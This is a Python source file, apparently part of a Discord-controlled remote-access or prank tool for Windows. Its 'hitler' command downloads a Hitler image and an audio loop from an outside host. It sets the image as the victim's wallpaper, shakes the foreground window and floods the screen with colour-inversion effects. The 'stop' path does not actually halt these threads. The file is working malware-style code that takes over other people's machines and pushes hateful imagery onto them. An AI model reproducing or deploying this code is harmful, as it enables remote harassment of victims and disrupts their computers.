import discord
from discord.ext import commands
import ctypes
import random
import threading
import time
import pygame
import os
import urllib.request
import uuid
import win32gui
import win32api
import win32con
import colorsys

is_playing = False
color_thread = None

def set_wallpaper(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

def random_offset_screen():
    while True:
        x_offset = random.randint(-10, 10)
        y_offset = random.randint(-10, 10)
        ctypes.windll.user32.SetWindowPos(
            ctypes.windll.user32.GetForegroundWindow(), 
            None, 
            x_offset, 
            y_offset, 
            0, 
            0, 
            0x0001 | 0x0002
        )
        time.sleep(0.001)

def play_sound(sound_file):
    global is_playing
    pygame.mixer.init()
    pygame.mixer.music.load(sound_file)
    pygame.mixer.music.play(-1)
    is_playing = True

def stop_sound():
    global is_playing
    if is_playing:
        pygame.mixer.music.stop()
        is_playing = False

def color_change_thread():
    user32 = ctypes.windll.user32
    user32.SetProcessDPIAware()
    [sw, sh] = [user32.GetSystemMetrics(0), user32.GetSystemMetrics(1)]
    color = 0
    while True:
        hdc = win32gui.GetDC(0)
        rgb_color = colorsys.hsv_to_rgb(color, 1.0, 1.0)
        brush = win32gui.CreateSolidBrush(
            win32api.RGB(
                int(rgb_color[0]) * 255, int(rgb_color[1]) * 255, int(rgb_color[2]) * 255
            )
        )
        win32gui.SelectObject(hdc, brush)
        win32gui.BitBlt(
            hdc,
            random.randint(-10, 10),
            random.randint(-10, 10),
            sw,
            sh,
            hdc,
            0,
            0,
            win32con.SRCCOPY,
        )
        win32gui.BitBlt(
            hdc,
            random.randint(-10, 10),
            random.randint(-10, 10),
            sw,
            sh,
            hdc,
            0,
            0,
            win32con.PATINVERT,
        )
        color += 0.05
        time.sleep(0.01)  # Sleep to control the speed of the color change

async def hitler_command(ctx, action: str):
    global color_thread
    if action.lower() not in ['start', 'stop']:
        await ctx.send("Please use `start` or `stop`.")
        return

    if action.lower() == 'start':
        wallpaper_url = "https://thugging.org/static/hitlerlol.jpg"
        wallpaper_path = os.path.join(os.getenv('TEMP'), "hitlerlol.png")
        urllib.request.urlretrieve(wallpaper_url, wallpaper_path)
        set_wallpaper(wallpaper_path)

        threading.Thread(target=random_offset_screen, daemon=True).start()

        sound_url = "https://thugging.org/static/lol.mp3"
        random_filename = f"{uuid.uuid4().hex[:50]}.mp3"
        sound_path = os.path.join(os.getenv('TEMP'), random_filename)
        urllib.request.urlretrieve(sound_url, sound_path)

        threading.Thread(target=play_sound, args=(sound_path,), daemon=True).start()

        color_thread = threading.Thread(target=color_change_thread, daemon=True)
        color_thread.start()

        await ctx.send("Hitler mode has been activated!")
        
    elif action.lower() == 'stop':
        stop_sound()

        new_wallpaper_url = "https://th.bing.com/th/id/R.12eb34a39aeca72ef46fe0505a801877?rik=P43ztaHsAcB88Q&pid=ImgRaw&r=0"
        new_wallpaper_path = os.path.join(os.getenv('TEMP'), "new_wallpaper.png")
        urllib.request.urlretrieve(new_wallpaper_url, new_wallpaper_path)
        set_wallpaper(new_wallpaper_path)

        if color_thread is not None:
            color_thread.join(timeout=0)  # Stops the color change thread
        
        await ctx.send("Hitler mode has been deactivated!")
